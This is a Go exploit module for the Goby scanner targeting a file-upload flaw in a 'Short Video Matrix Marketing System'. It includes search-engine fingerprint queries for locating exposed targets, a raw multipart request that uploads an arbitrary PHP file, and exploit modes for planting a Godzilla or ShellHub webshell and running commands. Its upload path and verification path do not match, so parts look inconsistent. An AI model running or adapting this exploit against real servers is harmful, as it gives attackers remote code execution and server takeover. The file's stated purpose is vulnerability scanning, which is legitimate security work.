package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Short Video Matrix Marketing System /static/admin/upload_file/php/upload.php File Upload Vulnerability",
    "Description": "<p>The Short Video Matrix Marketing System is a platform designed for managing and marketing short video content, providing various features to support users in matrix-based short video operations. A file upload vulnerability exists in the /static/admin/upload_file/php/upload.php interface, allowing attackers to upload malicious files, potentially leading to server control or malicious operations.</p>",
    "Product": "Short Video Matrix Marketing System",
    "Homepage": "http://www.lygtin.com/qi/?id=87630&lx=lx",
    "DisclosureDate": "2024-06-26",
    "PostTime": "2025-01-23",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"短视频矩阵营销系统\"||body=\"短视频矩阵营销系统\" && title=\"短视频矩阵营销系统\"",
    "GobyQuery": "body=\"短视频矩阵营销系统\"||body=\"短视频矩阵营销系统\" && title=\"短视频矩阵营销系统\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit the /static/admin/upload_file/php/upload.php interface to upload malicious files, leading to server control or malicious operations, potentially causing data breaches, service disruptions, and other severe consequences.</p>",
    "Recommendation": "<p>1. Restrict the type and size of uploaded files.2. Perform strict security checks on uploaded files.3. Update the system to the latest version or contact the vendor for security patches.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Godzilla,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/static/admin/upload_file/php/upload.php",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7",
                    "Content-Type": "multipart/form-data; boundary=---------------------------WebKitFormBoundaryEN9zABmT3hj5yIcf",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
                },
                "data_type": "text",
                "data": "-----------------------------WebKitFormBoundaryEN9zABmT3hj5yIcf\r\nContent-Disposition: form-data; name=\"files\"; filename=\"aaa.php\"\r\nContent-Type: application/octet-stream\r\n\r\n{{{CONTENT}}}\r\n-----------------------------WebKitFormBoundaryEN9zABmT3hj5yIcf--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "短视频矩阵营销系统 /static/admin/upload_file/php/upload.php 文件上传漏洞",
            "Product": "短视频矩阵营销系统",
            "Description": "<p>短视频矩阵营销系统是一款用于短视频内容管理和营销的系统，提供多种功能以支持用户进行短视频矩阵化运营。系统的 /static/admin/upload_file/php/upload.php 接口存在文件上传漏洞，攻击者可以利用该漏洞上传恶意文件，从而控制服务器或执行恶意操作。</p>",
            "Recommendation": "<p>1. 限制上传文件的类型和大小。2. 对上传文件进行严格的安全检查。3. 更新系统至最新版本或联系厂商获取安全补丁。</p>",
            "Impact": "<p>攻击者可以通过 /static/admin/upload_file/php/upload.php 接口上传恶意文件，导致服务器被控制或执行恶意操作，可能造成数据泄露、服务中断等严重后果。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Short Video Matrix Marketing System /static/admin/upload_file/php/upload.php File Upload Vulnerability",
            "Product": "Short Video Matrix Marketing System",
            "Description": "<p>The Short Video Matrix Marketing System is a platform designed for managing and marketing short video content, providing various features to support users in matrix-based short video operations. A file upload vulnerability exists in the /static/admin/upload_file/php/upload.php interface, allowing attackers to upload malicious files, potentially leading to server control or malicious operations.</p>",
            "Recommendation": "<p>1. Restrict the type and size of uploaded files.2. Perform strict security checks on uploaded files.3. Update the system to the latest version or contact the vendor for security patches.</p>",
            "Impact": "<p>Attackers can exploit the /static/admin/upload_file/php/upload.php interface to upload malicious files, leading to server control or malicious operations, potentially causing data breaches, service disruptions, and other severe consequences.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|php",
        "VUL_URL": "define|variable|/static/admin/upload_file/php/upload.php",
        "FILE_PATH": "define|variable|/static/admin/upload_file/uploads/aaa.p.php"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL",
        "FILE_PATH"
    ],
    "EditType": "fast",
    "PocId": "9984"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }